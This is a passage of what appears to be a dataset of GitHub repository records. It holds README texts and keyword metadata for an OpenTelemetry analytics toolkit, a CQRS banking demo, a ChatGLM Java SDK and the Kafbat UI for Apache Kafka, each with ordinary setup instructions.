With this OTLP Input Format you can build OpenTelemetry ingestion pipelines into Apache
Druid. For example:
- Use the [OpenTelemetry Kafka Exporter](https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/main/exporter/kafkaexporter/README.md) to publish
OTLP signals to an Apache Kafka topic, then the [Druid Kafka Ingestion](https://druid.apache.org/docs/latest/ingestion/kafka-ingestion/) with this Input Format to get Druid
tables with your telemetry.
- In a similar way you can also use other Druid input sources developed by mishmash io -
like with [Apache BookKeeper](https://bookkeeper.apache.org) or [Apache Pulsar](https://pulsar.apache.org). For details - check the related artifact documentation.

Find out more about the OTLP Input Format for Apache Druid:
- [README](./druid-otlp-format)
- [Javadoc on javadoc.io](https://javadoc.io/doc/io.mishmash.opentelemetry/druid-otlp-format)
- [Quick deployment with a demo app and Apache Superset](https://github.com/mishmash-io/opentelemetry-demos)

## Apache Superset charts and dashboards

![superset-dashboard](https://github.com/user-attachments/assets/8dba1e13-bcb3-41c9-ac40-0c023a3825c8)

[Apache Superset](https://superset.apache.org/) is an open-source modern data exploration and visualization platform.

You can use its rich visualizations, no-code viz builder and its powerful SQL IDE to build your own OpenTelemetry analytics.

To get you started, we're publishing [data sources and visualizations](./superset-visualizations) that you can import into Apache Superset.

- [Quick deployment with a demo app](https://github.com/mishmash-io/opentelemetry-demos)
  
# OpenTelemetry at mishmash io

OpenTelemetry's main intent is the observability of production environments, but at [mishmash io](https://mishmash.io) it is part of our software development process. By saving telemetry from  **experiments** and **tests** of 
our own algorithms we ensure things like **performance** and **resource usage** of our distributed database, continuously and across releases.

We believe that adopting OpenTelemetry as a software development tool might be useful to you too, which is why we decided to open-source the tools we've built.

Learn more about the broader set of [OpenTelemetry-related activities](https://mishmash.io/open_source/opentelemetry) at
[mishmash io](https://mishmash.io/) and `follow` [GitHub profile](https://github.com/mishmash-io) for updates and new releases.
",4,0,6,apache-2.0,31.0,"['opentelemetry', 'apache', 'big', 'data', 'united', 'mishmash', 'io', 'repository', 'contains', 'code', 'receives', 'adapts', 'opentelemetry', 'signal', 'like', 'open', 'source', 'project', 'apache', 'analytics', 'ecosystem', 'blend', 'bundle', 'build', 'observability', 'analytics', 'backends', 'batch', 'processing', 'apache', 'spark', 'hive', 'analytics', 'apache', 'druid', 'apache', 'superset', 'machine', 'learning', 'ai', 'also', 'find', 'additional', 'tool', 'example', 'demo', 'might', 'service', 'opentelemetry', 'journey', 'tip', 'public', 'release', 'code', 'accumulated', 'internally', 'time', 'far', 'contains', 'limited', 'subset', 'intend', 'share', 'example', 'internal', 'software', 'published', 'near', 'future', 'include', 'small', 'otlp', 'server', 'based', 'apache', 'bookkeeper', 'improved', 'data', 'ingestion', 'reliability', 'even', 'across', 'node', 'failure', 'opentelemetry', 'data', 'source', 'apache', 'pulsar', 'complex', 'preprocessing', 'needed', 'testcontainers', 'implementation', 'use', 'ensure', 'apps', 'always', 'produce', 'necessary', 'telemetry', 'track', 'performance', 'across', 'release', 'watch', 'repository', 'update', 'content', 'opentelemetry', 'compare', 'telemetry', 'software', 'introduction', 'opentelemetry', 'developer', 'data', 'engineer', 'data', 'scientist', 'use', 'code', 'software', 'artifact', 'embed', 'otlp', 'collector', 'java', 'system', 'save', 'opentelemetry', 'apache', 'parquet', 'file', 'ingest', 'opentelemetry', 'apache', 'druid', 'visualize', 'opentelemetry', 'apache', 'superset', 'opentelemetry', 'mishmash', 'io', 'switch', 'opentelemetry', 'new', 'opentelemetry', 'might', 'thinking', 'better', 'multitude', 'existing', 'telemetry', 'implementation', 'many', 'already', 'available', 'well', 'established', 'within', 'popular', 'runtimes', 'like', 'kubernetes', 'example', 'number', 'advantage', 'opentelemetry', 'offer', 'compared', 'earlier', 'telemetry', 'signal', 'type', 'correlatable', 'exmpale', 'explore', 'emitted', 'inside', 'given', 'potentially', 'failing', 'see', 'work', 'refer', 'opentelemetry', 'developer', 'data', 'engineer', 'data', 'scientist', 'example', 'section', 'precise', 'timing', 'unlike', 'telemetry', 'opentelemetry', 'data', 'avoiding', 'extra', 'request', 'needed', 'pull', 'data', 'opentelemetry', 'report', 'much', 'accurate', 'timestamps', 'event', 'emitted', 'value', 'updated', 'telemetry', 'add', 'telemetry', 'existing', 'apps', 'without', 'code', 'modification', 'using', 'popular', 'framework', 'already', 'opentelemetry', 'instrumentation', 'work', 'box', 'see', 'opentelemetry', 'doc', 'programming', 'language', 'also', 'need', 'implement', 'special', 'endpoint', 'request', 'handler', 'supply', 'telemetry', 'cpu', 'overhead', 'telemetry', 'emitted', 'code', 'instrumented', 'opentelemetry', 'run', 'without', 'configured', 'signal', 'exporter', 'basically', 'disabled', 'opentelemetry', 'api', 'method', 'basically', 'empty', 'perform', 'operation', 'thus', 'requiring', 'cpu', 'major', 'company', 'already', 'support', 'opentelemetry', 'large', 'infrastructure', 'provider', 'public', 'cloud', 'like', 'azure', 'aws', 'gcp', 'already', 'seamlessly', 'integrate', 'monitoring', 'observability', 'service', 'opentelemetry', 'instrumenting', 'code', 'opentelemetry', 'mean', 'monitored', 'without', 'code', 'change', 'sound', 'convincing', 'keep', 'reading', 'document', 'explore', 'link', 'opentelemetry', 'developer', 'data', 'engineer', 'data', 'scientist', 'prepared', 'jupyter', 'notebook', 'visually', 'explore', 'opentelemetry', 'data', 'collected', 'demo', 'astronomy', 'webshop', 'app', 'using', 'apache', 'parquet', 'server', 'contained', 'repository', 'tip', 'sort', 'person', 'prefers', 'learn', 'looking', 'actual', 'data', 'start', 'opentelemetry', 'basic', 'notebook', 'use', 'software', 'repository', 'mishmsah', 'io', 'using', 'opentelemetry', 'quite', 'time', 'recording', 'telemetry', 'experiment', 'unit', 'integration', 'test', 'ensure', 'every', 'new', 'release', 'software', 'develop', 'performing', 'better', 'last', 'within', 'reasonable', 'usage', 'tip', 'opentelemetry', 'great', 'monitoring', 'software', 'production', 'believe', 'adopt', 'within', 'software', 'development', 'process', 'journey', 'realised', 'success', 'depends', 'strong', 'analytics', 'opentelemetry', 'provides', 'number', 'tool', 'instrument', 'code', 'emit', 'signal', 'compose', 'data', 'transmission', 'pipeline', 'signal', 'leaf', 'decide', 'ultimately', 'want', 'signal', 'want', 'store', 'depends', 'work', 'compose', 'pipeline', 'signal', 'transmition', 'using', 'opentelemetry', 'collector', 'turn', 'us', 'network', 'protocol', 'called', 'otlp', 'end', 'pipeline', 'network', 'protocol', 'otlp', 'great', 'reducing', 'number', 'byte', 'transmitted', 'keeping', 'throughput', 'high', 'minimum', 'overhead', 'heavily', 'message', 'avoid', 'data', 'duplication', 'take', 'maximum', 'advantage', 'data', 'compression', 'analytics', 'side', 'though', 'heavily', 'nested', 'structure', 'optimal', 'simple', 'query', 'done', 'million', 'otlp', 'message', 'one', 'every', 'time', 'run', 'query', 'second', 'reason', 'believe', 'might', 'find', 'software', 'useful', 'tip', 'analytics', 'observability', 'data', 'need', 'suitable', 'data', 'schema', 'tool', 'repository', 'convert', 'otlp', 'message', 'schema', 'suitable', 'analytics', 'preform', 'transformation', 'otlp', 'packet', 'reception', 'minimize', 'overhead', 'would', 'otherwise', 'incurred', 'every', 'time', 'run', 'analytics', 'job', 'query', 'following', 'quick', 'introduction', 'individual', 'software', 'package', 'find', 'information', 'tip', 'wondering', 'get', 'first', 'opentelemetry', 'data', 'set', 'check', 'fork', 'opentelemetry', 'demo', 'app', 'find', 'complete', 'deployment', 'generate', 'signal', 'save', 'let', 'play', 'data', 'writing', 'notebook', 'creating', 'apache', 'superset', 'dashboard', 'artifact', 'embeddable', 'collector', 'base', 'artifact', 'contains', 'class', 'handle', 'otlp', 'protocol', 'grpc', 'http', 'readme', 'javadoc', 'apache', 'parquet', 'server', 'artifact', 'contains', 'runnable', 'server', 'receives', 'signal', 'opentelemetry', 'save', 'apache', 'paruqet', 'file', 'intended', 'production', 'use', 'rather', 'quick', 'tool', 'save', 'explore', 'opentelemetry', 'data', 'locally', 'basic', 'jupyter', 'notebook', 'explores', 'parquet', 'file', 'saved', 'server', 'readme', 'javadoc', 'quick', 'deployment', 'demo', 'app', 'apache', 'druid', 'otlp', 'input', 'format', 'use', 'artifact', 'ingesting', 'opentelemetry', 'signal', 'apache', 'druid', 'combination', 'input', 'source', 'like', 'apache', 'kafka', 'apache', 'druid', 'high', 'performance', 'analytics', 'database', 'delivers', 'query', 'streaming', 'batch', 'data', 'scale', 'load', 'make', 'perfect', 'opentelemetry', 'data', 'analytics', 'otlp', 'input', 'format', 'build', 'opentelemetry', 'ingestion', 'pipeline', 'apache', 'druid', 'example', 'use', 'opentelemetry', 'kafka', 'exporter', 'publish', 'otlp', 'signal', 'apache', 'kafka', 'topic', 'druid', 'kafka', 'ingestion', 'input', 'format', 'get', 'druid', 'table', 'telemetry', 'similar', 'way', 'also', 'use', 'druid', 'input', 'source', 'developed', 'mishmash', 'io', 'like', 'apache', 'bookkeeper', 'apache', 'pulsar', 'detail', 'check', 'related', 'artifact', 'documentation', 'find', 'otlp', 'input', 'format', 'apache', 'druid', 'readme', 'javadoc', 'quick', 'deployment', 'demo', 'app', 'apache', 'superset', 'apache', 'superset', 'chart', 'dashboard', 'apache', 'superset', 'modern', 'data', 'exploration', 'visualization', 'platform', 'use', 'rich', 'visualization', 'viz', 'builder', 'powerful', 'sql', 'ide', 'build', 'opentelemetry', 'analytics', 'get', 'started', 'publishing', 'data', 'source', 'visualization', 'import', 'apache', 'superset', 'quick', 'deployment', 'demo', 'app', 'opentelemetry', 'mishmash', 'io', 'opentelemetry', 'main', 'intent', 'observability', 'production', 'environment', 'mishmash', 'io', 'part', 'software', 'development', 'process', 'saving', 'telemetry', 'experiment', 'test', 'algorithm', 'ensure', 'thing', 'like', 'performance', 'resource', 'usage', 'distributed', 'database', 'continuously', 'across', 'release', 'believe', 'adopting', 'opentelemetry', 'software', 'development', 'tool', 'might', 'useful', 'decided', 'tool', 'built', 'learn', 'broader', 'set', 'activity', 'mishmash', 'io', 'github', 'profile', 'update', 'new', 'release']","['opentelemetry', 'apache', 'data', 'otlp', 'telemetry']",7,0,0,"['opentelemetry', 'apache', 'big', 'data', 'united', 'mishmash', 'io', 'why', 'switch', 'opentelemetry', 'opentelemetry', 'developer', 'data', 'engineer', 'data', 'scientist', 'when', 'use', 'software', 'repository', 'artifact', 'embeddable', 'collector', 'apache', 'parquet', 'server', 'apache', 'druid', 'otlp', 'input', 'format', 'apache', 'superset', 'chart', 'dashboard', 'opentelemetry', 'mishmash', 'io']",10,"['opentelemetry', 'apache', 'data', 'mishmash', 'io']",0,0.0,5.0,"[org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.xolstice.maven.plugins:protobuf-maven-plugin]",0.0,4.0,1.0,11710,29.719298245614038,5.419126328217238,"['OpenTelemetry -> https://opentelemetry.io/', 'Apache -> https://www.apache.org/', 'Apache BookKeeper -> https://bookkeeper.apache.org/', 'Apache Pulsar -> https://pulsar.apache.org/', 'Testcontainers -> https://testcontainers.com/', 'OpenTelemetry docs for your programming language. -> https://opentelemetry.io/docs/languages/', 'a demo Astronomy webshop app -> https://github.com/mishmash-io/opentelemetry-demos', 'mishmsah io, -> https://mishmash.io/', 'here. -> https://mishmash.io/open_source/opentelemetry', 'instrument your code -> https://opentelemetry.io/docs/concepts/instrumentation/', 'OpenTelemetry Collector, -> https://opentelemetry.io/docs/collector/', 'OTLP. -> https://opentelemetry.io/docs/specs/otel/protocol/', ""our fork of OpenTelemetry's Demo app. -> https://github.com/mishmash-io/opentelemetry-demos"", 'Javadoc on javadoc.io -> https://javadoc.io/doc/io.mishmash.opentelemetry/collector-embedded', 'Apache Paruqet -> https://parquet.apache.org/', 'Javadoc on javadoc.io -> https://javadoc.io/doc/io.mishmash.opentelemetry/server-parquet', 'Quick deployment with a demo app -> https://github.com/mishmash-io/opentelemetry-demos', 'Apache Druid -> https://druid.apache.org', 'OpenTelemetry Kafka Exporter -> https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/main/exporter/kafkaexporter/README.md', 'Druid Kafka Ingestion -> https://druid.apache.org/docs/latest/ingestion/kafka-ingestion/', 'Apache BookKeeper -> https://bookkeeper.apache.org', 'Apache Pulsar -> https://pulsar.apache.org', 'Javadoc on javadoc.io -> https://javadoc.io/doc/io.mishmash.opentelemetry/druid-otlp-format', 'Quick deployment with a demo app and Apache Superset -> https://github.com/mishmash-io/opentelemetry-demos', 'superset-dashboard -> https://github.com/user-attachments/assets/8dba1e13-bcb3-41c9-ac40-0c023a3825c8', 'Apache Superset -> https://superset.apache.org/', 'Quick deployment with a demo app -> https://github.com/mishmash-io/opentelemetry-demos', 'mishmash io -> https://mishmash.io', 'OpenTelemetry-related activities -> https://mishmash.io/open_source/opentelemetry', 'mishmash io -> https://mishmash.io/', 'GitHub profile -> https://github.com/mishmash-io']",31
SpringBootCourses/cqrs-banking-app,main,"# CQRS and Event-Sourcing Banking App

Banking app example for **CQRS and Event-Sourcing pattern**.

This repository contains project
from [YouTube course](https://www.youtube.com/playlist?list=PL3Ur78l82EFD_M2te726IZ63rwBlY96M-).

You can find theory and explanation
in [this document](https://docs.google.com/document/d/1-TTxft3nS5C11puQ1LMLj3ZEtY4sOhp7WEEMkltnwds/edit).

## Application schema

![Schema](docs/schema.png)

## CQRS and Event-Sourcing

![CQRS](docs/cqrs.png)

![Event Sourcing](docs/event-sourcing.png)

## Change Data Capture

![CDC](docs/cdc.png)

## Usage

To start an application you need to pass variables to `.env` file. Look
at `.env.example` file with some predefined environments.

All services are running in docker containers. To start the application
you need to run `docker-compose up -d` command.

**NOTE**: after Debezium connect is started, apply source config manually.

```shell
cd /on-startup/

sh run.sh
```

Application is running on port `8080` for backend and `8081` for event handler.

You can access endpoints and make requests to the application.

## How to contribute

If you found a bug or want to improve the application, feel free to create
an [issue](https://github.com/springbootcourses/cqrs-banking-app/issues).",0,5,7,mit,33.0,"['cqrs', 'banking', 'app', 'banking', 'app', 'example', 'cqrs', 'pattern', 'repository', 'contains', 'project', 'youtube', 'course', 'find', 'theory', 'explanation', 'document', 'application', 'schema', 'cqrs', 'change', 'data', 'capture', 'usage', 'start', 'application', 'need', 'pas', 'variable', 'file', 'look', 'file', 'predefined', 'environment', 'service', 'running', 'docker', 'container', 'start', 'application', 'need', 'run', 'command', 'note', 'debezium', 'connect', 'started', 'apply', 'source', 'config', 'manually', 'application', 'running', 'port', 'backend', 'event', 'handler', 'access', 'endpoint', 'make', 'request', 'application', 'contribute', 'found', 'bug', 'want', 'improve', 'application', 'feel', 'free', 'create', 'issue']","['application', 'cqrs', 'banking', 'app', 'start']",2,0,0,"['cqrs', 'banking', 'app', 'application', 'schema', 'cqrs', 'change', 'data', 'capture', 'usage', 'how', 'contribute']",6,"['cqrs', 'banking', 'app', 'application', 'schema']",1,0.0,4.0,"[org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,3.0,1.0,1262,12.266666666666667,5.25,"['YouTube course -> https://www.youtube.com/playlist?list=PL3Ur78l82EFD_M2te726IZ63rwBlY96M-', 'this document -> https://docs.google.com/document/d/1-TTxft3nS5C11puQ1LMLj3ZEtY4sOhp7WEEMkltnwds/edit', 'issue -> https://github.com/springbootcourses/cqrs-banking-app/issues']",3
1321928757/chatglm-sdk-java,master,"# 智谱Ai大模型开放SDK - By 刘仕杰

为了让研发伙伴更快，更方便的接入使用智谱Ai大模型。从而开发的 chatglm-sdk-java 也欢迎👏🏻大家基于智谱API接口补充需要的功能。

此SDK设计，以 Session 会话模型，提供工厂🏭创建服务。代码非常清晰，易于扩展、易于维护。(https://www.zhipuai.cn/)。

---

>**作者**：LuckySJ-刘仕杰 - 在线体验地址 [**www.luckysj.online**](https://www.luckysj.online/)

## 👣目录

1. 组件配置
2. 功能测试
   1. 代码执行 - `使用：代码的方式主要用于程序接入`
   2. 脚本测试 - `测试：生成Token，直接通过HTTP访问Ai服务`
3. 程序接入

## 1. 组件配置

- 申请ApiKey：[https://open.bigmodel.cn/usercenter/apikeys](https://open.bigmodel.cn/usercenter/apikeys) - 注册申请开通，即可获得 ApiKey
- 运行环境：JDK 1.8+
- maven pom - `未推送到Maven中央仓库，需要下载代码本地 install 后使用`

## 2. 功能测试

### 2.1 代码执行

```java
@Slf4j
public class ApiTest {

    private OpenAiSession openAiSession;

    @Before
    public void test_OpenAiSessionFactory() {
        // 1. 配置文件
        Configuration configuration = new Configuration();
        configuration.setApiHost(""https://open.bigmodel.cn/"");
        configuration.setApiSecretKey(""4e087e4135306ef4a676f0cce3cee560.sgP2*****"");
        // 2. 会话工厂
        OpenAiSessionFactory factory = new DefaultOpenAiSessionFactory(configuration);
        // 3. 开启会话
        this.openAiSession = factory.openSession();
    }

    /**
     * 流式对话
     */
    @Test
    public void test_completions() throws JsonProcessingException, InterruptedException {
        // 入参；模型、请求信息
        ChatCompletionRequest request = new ChatCompletionRequest();
        request.setModel(Model.CHATGLM_LITE); // chatGLM_6b_SSE、chatglm_lite、chatglm_lite_32k、chatglm_std、chatglm_pro
        request.setPrompt(new ArrayList<ChatCompletionRequest.Prompt>() {
            private static final long serialVersionUID = -7988151926241837899L;

            {
                add(ChatCompletionRequest.Prompt.builder()
                        .role(Role.user.getCode())
                        .content(""写个java冒泡排序"")
                        .build());
            }
        });

        // 请求
        openAiSession.completions(request, new EventSourceListener() {
            @Override
            public void onEvent(EventSource eventSource, @Nullable String id, @Nullable String type, String data) {
                ChatCompletionResponse response = JSON.parseObject(data, ChatCompletionResponse.class);
                log.info(""测试结果 onEvent：{}"", response.getData());
                // type 消息类型，add 增量，finish 结束，error 错误，interrupted 中断
                if (EventType.finish.getCode().equals(type)) {
                    ChatCompletionResponse.Meta meta = JSON.parseObject(response.getMeta(), ChatCompletionResponse.Meta.class);
                    log.info(""[输出结束] Tokens {}"", JSON.toJSONString(meta));
                }
            }

            @Override
            public void onClosed(EventSource eventSource) {
                log.info(""对话完成"");
            }
        });

        // 等待
        new CountDownLatch(1).await();
    }

}
```

- 这是一个单元测试类，也是最常使用的流式对话模式。

### 2.2 脚本测试

```java
@Test
public void test_curl() {
    // 1. 配置文件
    Configuration configuration = new Configuration();
    configuration.setApiHost(""https://open.bigmodel.cn/"");
    configuration.setApiSecretKey(""4e087e4135306ef4a676f0cce3cee560.sgP2D****"");
    // 2. 获取Token
    String token = BearerTokenUtils.getToken(configuration.getApiKey(), configuration.getApiSecret());
    log.info(""1. 在智谱Ai官网，申请 ApiSeretKey 配置到此测试类中，替换 setApiSecretKey 值。 https://open.bigmodel.cn/usercenter/apikeys"");
    log.info(""2. 运行 test_curl 获取 token：{}"", token);
    log.info(""3. 将获得的 token 值，复制到 curl.sh 中，填写到 Authorization: Bearer 后面"");
    log.info(""4. 执行完步骤3以后，可以复制直接运行 curl.sh 文件，或者复制 curl.sh 文件内容到控制台/终端/ApiPost中运行"");
}
```

```java
curl -X POST \
        -H ""Authorization: Bearer <把获得的Token填写这，并去掉两个尖括号>"" \
        -H ""Content-Type: application/json"" \
        -H ""User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)"" \
        -H ""Accept: text/event-stream"" \
        -d '{
        ""top_p"": 0.7,
        ""sseFormat"": ""data"",
        ""temperature"": 0.9,
        ""incremental"": true,
        ""request_id"": ""xfg-1696992276607"",
        ""prompt"": [
        {
        ""role"": ""user"",
        ""content"": ""写个java冒泡排序""
        }
        ]
        }' \
  http://open.bigmodel.cn/api/paas/v3/model-api/chatglm_lite/sse-invoke
```

- 运行后你会获得一个 Token 信息，之后在 curl.sh 中替换  Authorization: Bearer 后面的值。就可以执行测试了。

## 3. 程序接入

SpringBoot 配置类

```java
@Configuration
@EnableConfigurationProperties(ChatGLMSDKConfigProperties.class)
public class ChatGLMSDKConfig {

    @Bean
    @ConditionalOnProperty(value = ""chatglm.sdk.config.enabled"", havingValue = ""true"", matchIfMissing = false)
    public OpenAiSession openAiSession(ChatGLMSDKConfigProperties properties) {
        // 1. 配置文件
        cn.bugstack.chatglm.session.Configuration configuration = new cn.bugstack.chatglm.session.Configuration();
        configuration.setApiHost(properties.getApiHost());
        configuration.setApiSecretKey(properties.getApiSecretKey());

        // 2. 会话工厂
        OpenAiSessionFactory factory = new DefaultOpenAiSessionFactory(configuration);

        // 3. 开启会话
        return factory.openSession();
    }

}

@Data
@ConfigurationProperties(prefix = ""chatglm.sdk.config"", ignoreInvalidFields = true)
public class ChatGLMSDKConfigProperties {

    /** 状态；open = 开启、close 关闭 */
    private boolean enable;
    /** 转发地址 */
    private String apiHost;
    /** 可以申请 sk-*** */
    private String apiSecretKey;

}
```

```java
@Autowired(required = false)
private OpenAiSession openAiSession;
```

- 注意：如果你在服务中配置了关闭启动 ChatGLM SDK 那么注入 openAiSession 为 null

yml 配置

```pom
# ChatGLM SDK Config
chatglm:
  sdk:
    config:
      # 状态；true = 开启、false 关闭
      enabled: false
      # 官网地址 
      api-host: https://open.bigmodel.cn/
      # 官网申请 https://open.bigmodel.cn/usercenter/apikeys
      api-secret-key: 4e087e4135306ef4a676f0cce3cee560.sgP2DUs*****
```
",0,0,1,apache-2.0,0.0,"['session', 'http', 'http', 'apikey', 'maven', 'pom', 'token', 'authorization', 'bearer', 'springboot', 'chatglm', 'sdk', 'openaisession', 'null', 'yml']","['http', 'session', 'apikey', 'maven', 'pom']",0,0,0,"['by', 'chatglm', 'sdk', 'config', 'http']",11,"['by', 'chatglm', 'sdk', 'config', 'http']",6,3.0,1.0,"[org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:versions-maven-plugin]",0.0,1.0,0.0,5814,26.38095238095238,6.736462093862816,"['**www.luckysj.online** -> https://www.luckysj.online/', 'https://open.bigmodel.cn/usercenter/apikeys -> https://open.bigmodel.cn/usercenter/apikeys', '输出结束']",3
kafbat/kafka-ui,main,"<div align=""center"">
<img src=""documentation/images/logo_new.png"" alt=""logo""/>
<h3>Kafbat UI</h3>

Versatile, fast and lightweight web UI for managing Apache Kafka® clusters.
</div>

<div align=""center"">
<a href=""https://github.com/kafbat/kafka-ui/blob/main/LICENSE""><img src=""https://img.shields.io/badge/License-Apache%202.0-blue.svg"" alt=""License""/></a>
<img src=""documentation/images/free-open-source.svg"" alt=""price free""/>
<a href=""https://github.com/kafbat/kafka-ui/releases""><img src=""https://img.shields.io/github/v/release/kafbat/kafka-ui"" alt=""latest release version""/></a>
<a href=""https://discord.gg/4DWzD7pGE5""><img src=""https://img.shields.io/discord/897805035122077716"" alt=""discord online number count""/></a>
<a href=""https://github.com/sponsors/kafbat""><img src=""https://img.shields.io/github/sponsors/kafbat?style=flat&logo=githubsponsors&logoColor=%23EA4AAA&label=Support%20us"" alt="""" /></a>
</div>

<p align=""center"">
    <a href=""https://ui.docs.kafbat.io/"">Documentation</a> • 
    <a href=""https://ui.docs.kafbat.io/configuration/quick-start"">Quick Start</a> • 
    <a href=""https://discord.gg/4DWzD7pGE5"">Community</a>
    <br/>
    <a href=""https://aws.amazon.com/marketplace/pp/{replaceMe}"">AWS Marketplace</a>  •
    <a href=""https://www.producthunt.com/products/ui-for-apache-kafka/reviews/new"">ProductHunt</a>
</p>

<p align=""center"">
  <img src=""https://repobeats.axiom.co/api/embed/88d2bd9887380c7d86e2f986725d9af52ebad7f4.svg"" alt=""stats""/>
</p>

#### Kafbat UI is a free, open-source web UI to monitor and manage Apache Kafka clusters.

Kafbat UI is a simple tool that makes your data flows observable, helps find and troubleshoot issues faster and deliver optimal performance. Its lightweight dashboard makes it easy to track key metrics of your Kafka clusters - Brokers, Topics, Partitions, Production, and Consumption.

<i>
Kafbat UI, developed by <b>Kafbat</b>*, proudly carries forward the legacy of the UI Apache Kafka project.
Our dedication is reflected in the continuous evolution of the project, ensuring adherence to its foundational vision while adapting to meet modern demands.
We extend our gratitude to Provectus for their past support in groundbreaking work, which serves as a cornerstone for our ongoing innovation and dedication.

<b>*</b> - The <b>Kafbat</b> team comprises key contributors from the project's inception, bringing a wealth of experience and insight to this renewed endeavor.
</i>

# Interface

![Interface](https://raw.githubusercontent.com/kafbat/kafka-ui/images/overview.gif)

# Features
* **Multi-Cluster Management** — monitor and manage all your clusters in one place
* **Performance Monitoring with Metrics Dashboard** —  track key Kafka metrics with a lightweight dashboard
* **View Kafka Brokers** — view topic and partition assignments, controller status
* **View Kafka Topics** — view partition count, replication status, and custom configuration
* **View Consumer Groups** — view per-partition parked offsets, combined and per-partition lag
* **Browse Messages** — browse messages with JSON, plain text, and Avro encoding
* **Dynamic Topic Configuration** — create and configure new topics with dynamic configuration
* **Configurable Authentification** — [secure](https://ui.docs.kafbat.io/configuration/authentication) your installation with optional Github/Gitlab/Google OAuth 2.0
* **Custom serialization/deserialization plugins** - [use](https://ui.docs.kafbat.io/configuration/serialization-serde) a ready-to-go serde for your data like AWS Glue or Smile, or code your own!
* **Role based access control** - [manage permissions](https://ui.docs.kafbat.io/configuration/rbac-role-based-access-control) to access the UI with granular precision
* **Data masking** - [obfuscate](https://ui.docs.kafbat.io/configuration/data-masking) sensitive data in topic messages

## Feature overview

<details>
    <summary>Click here for the feature overview</summary>

# The Interface
Kafbat UI wraps major functions of Apache Kafka with an intuitive user interface.

![Interface](documentation/images/Interface.gif)

## Topics
Kafbat UI makes it easy for you to create topics in your browser by several clicks,
pasting your own parameters, and viewing topics in the list.

![Create Topic](documentation/images/Create_topic_kafka-ui.gif)

It's possible to jump from connectors view to corresponding topics and from a topic to consumers (back and forth) for more convenient navigation.
connectors, overview topic settings.

![Connector_Topic_Consumer](documentation/images/Connector_Topic_Consumer.gif)

### Messages
Let's say we want to produce messages for our topic. With the Kafbat UI we can send or write data/messages to the Kafka topics without effort by specifying parameters, and viewing messages in the list.

![Produce Message](documentation/images/Create_message_kafka-ui.gif)

## Schema registry
There are 3 supported types of schemas: Avro®, JSON Schema, and Protobuf schemas.

![Create Schema Registry](documentation/images/Create_schema.gif)

Before producing avro/protobuf encoded messages, you have to add a schema for the topic in Schema Registry. Now all these steps are easy to do
with a few clicks in a user-friendly interface.

![Avro Schema Topic](documentation/images/Schema_Topic.gif)

</details>

# Getting Started

To run Kafbat UI, you can use either a pre-built Docker image or build it (or a jar file) yourself.

## Quick start (Demo run)

```
docker run -it -p 8080:8080 -e DYNAMIC_CONFIG_ENABLED=true ghcr.io/kafbat/kafka-ui
```

Then access the web UI at [http://localhost:8080](http://localhost:8080)

The command is sufficient to try things out. When you're done trying things out, you can proceed with a [persistent installation](https://ui.docs.kafbat.io/quick-start/persistent-start)

## Persistent installation

```
services:
  kafbat-ui:
    container_name: kafbat-ui
    image: ghcr.io/kafbat/kafka-ui:latest
    ports:
      - 8080:8080
    environment:
      DYNAMIC_CONFIG_ENABLED: 'true'
    volumes:
      - ~/kui/config.yml:/etc/kafkaui/dynamic_config.yaml
```

Please refer to our [configuration](https://ui.docs.kafbat.io/configuration/configuration-file) page to proceed with further app configuration.

## Some useful configuration related links

[Web UI Cluster Configuration Wizard](https://ui.docs.kafbat.io/configuration/configuration-wizard)

[Configuration file explanation](https://ui.docs.kafbat.io/configuration/configuration-file)

[Docker Compose examples](https://ui.docs.kafbat.io/configuration/compose-examples)

[Misc configuration properties](https://ui.docs.kafbat.io/configuration/misc-configuration-properties)

## Helm charts

[Quick start](https://ui.docs.kafbat.io/configuration/helm-charts/quick-start)

## Building from sources

[Quick start](https://ui.docs.kafbat.io/development/building/prerequisites) with building

## Liveliness and readiness probes
Liveliness and readiness endpoint is at `/actuator/health`.<br/>
Info endpoint (build info) is located at `/actuator/info`.

# Configuration options

All the environment variables/config properties could be found [here](https://ui.docs.kafbat.io/configuration/misc-configuration-properties).

# Contributing

Please refer to [contributing guide](https://ui.docs.kafbat.io/development/contributing), we'll guide you from there.

# Support

As we're fully independent, team members contribute in their free time.
Your support is crucial for us, if you wish to sponsor us, take a look [here](https://github.com/sponsors/kafbat) 
",1,132,51,apache-2.0,175.0,"['versatile', 'fast', 'lightweight', 'web', 'ui', 'managing', 'apache', 'cluster', 'kafbat', 'ui', 'free', 'web', 'ui', 'monitor', 'manage', 'apache', 'kafka', 'cluster', 'kafbat', 'ui', 'simple', 'tool', 'make', 'data', 'flow', 'observable', 'help', 'find', 'troubleshoot', 'issue', 'faster', 'deliver', 'optimal', 'performance', 'lightweight', 'dashboard', 'make', 'easy', 'track', 'key', 'metric', 'kafka', 'cluster', 'broker', 'topic', 'partition', 'production', 'consumption', 'kafbat', 'team', 'comprises', 'key', 'contributor', 'project', 'inception', 'bringing', 'wealth', 'experience', 'insight', 'renewed', 'endeavor', 'interface', 'feature', 'management', 'monitor', 'manage', 'cluster', 'one', 'place', 'performance', 'monitoring', 'metric', 'dashboard', 'track', 'key', 'kafka', 'metric', 'lightweight', 'dashboard', 'view', 'kafka', 'broker', 'view', 'topic', 'partition', 'assignment', 'controller', 'status', 'view', 'kafka', 'topic', 'view', 'partition', 'count', 'replication', 'status', 'custom', 'configuration', 'view', 'consumer', 'group', 'view', 'parked', 'offset', 'combined', 'lag', 'browse', 'message', 'browse', 'message', 'json', 'plain', 'text', 'avro', 'encoding', 'dynamic', 'topic', 'configuration', 'create', 'configure', 'new', 'topic', 'dynamic', 'configuration', 'configurable', 'authentification', 'secure', 'installation', 'optional', 'oauth', 'custom', 'plugins', 'use', 'serde', 'data', 'like', 'aws', 'glue', 'smile', 'code', 'role', 'based', 'access', 'control', 'manage', 'permission', 'access', 'ui', 'granular', 'precision', 'data', 'masking', 'obfuscate', 'sensitive', 'data', 'topic', 'message', 'feature', 'overview', 'interface', 'kafbat', 'ui', 'wrap', 'major', 'function', 